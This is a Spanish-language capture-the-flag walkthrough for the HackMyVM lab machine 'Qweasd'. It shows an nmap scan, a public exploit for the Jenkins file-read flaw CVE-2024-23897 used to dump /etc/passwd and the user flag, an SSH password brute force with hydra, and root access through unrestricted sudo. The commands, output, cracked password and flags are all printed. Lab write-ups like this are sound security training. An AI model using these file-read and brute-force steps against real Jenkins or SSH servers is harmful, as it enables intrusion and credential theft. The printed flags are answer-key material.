---
icon: flag
---

# Qweasd HackMyVM (Intermediate - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-03 02:27 EDT
Nmap scan report for 192.168.1.167
Host is up (0.00067s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 fa:b1:dc:5b:9e:54:8c:bd:24:4c:43:0c:25:fd:4d:d8 (ECDSA)
|_  256 29:71:69:ca:bc:74:48:26:45:34:77:69:29:a5:d2:fc (ED25519)
8080/tcp open  http    Jetty 10.0.18
|_http-title: Dashboard [Jenkins]
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Jetty(10.0.18)
| http-robots.txt: 1 disallowed entry 
|_/
MAC Address: 08:00:27:35:7A:0D (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.03 seconds
```

Vemos que tenemos un puerto `8080` en el que de primeras el escaneo de `nmap` ya nos dice que es un `Jenkins`, si entramos dentro veremos que ciertamente se trata de un `Jenkins` pero nos dejara entrar de forma anonima, por lo que vamos a investigar.

Si leemos abajo a la derecha, veremos la version del `Jenkins`:

<figure><img src="../../.gitbook/assets/image (339).png" alt=""><figcaption></figcaption></figure>

Vamos a buscar algun `exploit` que este asociado a dicha version, si empezamos a buscar veremos que si lo encontraremos y sera para leer archivos de forma arbitraria en el sistema (`LFI`) que pertenece al `CVE-2024-23897`, si nos decargarmos el `exploit` de `Exploit DB`:

URL = [Download Exploit LFI Jenkins](https://www.exploit-db.com/exploits/51993)

Una vez descargado vamos a utilizarlo de la siguiente forma:

```shell
python3 51993.py -u http://<IP>:8080/ -p /etc/passwd
```

Info:

```
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
dnsmasq:x:113:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
penetration:x:1001:1001::/home/penetration:/bin/bash
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
kali:x:1000:1000:asd:/home/kali:/bin/bash
root:x:0:0:root:/root:/bin/bash
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
games:x:5:60:games:/usr/games:/usr/sbin/nologin
```

Vemos que ha funcionado y obtendremos `2` usuarios a nivel de sistema:

```
penetration:x:1001:1001::/home/penetration:/bin/bash
kali:x:1000:1000:asd:/home/kali:/bin/bash
```

Vamos a probar a leer la `flag` del usuario en este caso de `penetration`:

```shell
python3 51993.py -u http://<IP>:8080/ -p /home/penetration/user.txt
```

> user.txt

```
flag{Whynotjoinsomehackercommunicationgroups_}
```

## Escalate user penetration

### Hydra

Vamos a realizar un ataque de fuerza bruta al usuario `kali` para ver si obtenemos algo.

```shell
hydra -l kali -P <WORDLIST> ssh://<IP> -t 64 -I
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-03 02:49:07
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://192.168.1.167:22/
[22][ssh] host: 192.168.1.167   login: kali   password: asdfgh
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 30 final worker threads did not complete until end.
[ERROR] 30 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-03 02:49:39
```

Vemos que obtuvimos las credenciales del usuario `kali` por lo que nos conectaremos por `SSH`.

### SSH

```shell
ssh kali@<IP>
```

Metemos como contraseña `asdfgh` y veremos que estamos dentro.

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for kali on asd:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User kali may run the following commands on asd:
    (ALL : ALL) ALL
```

Vemos que podemos ejecutar cualquier cosa como el usuario `root` por lo que haremos lo siguiente:

```shell
sudo su
```

Info:

```
root@asd:/home/kali# whoami
root
```

Y con esto ya seremos `root`, por lo que leeremos la `flag` del `root`.

> root.txt

```
flag{Hackercommunicationgroup660930334iswaitingforyoutojoin_}
```
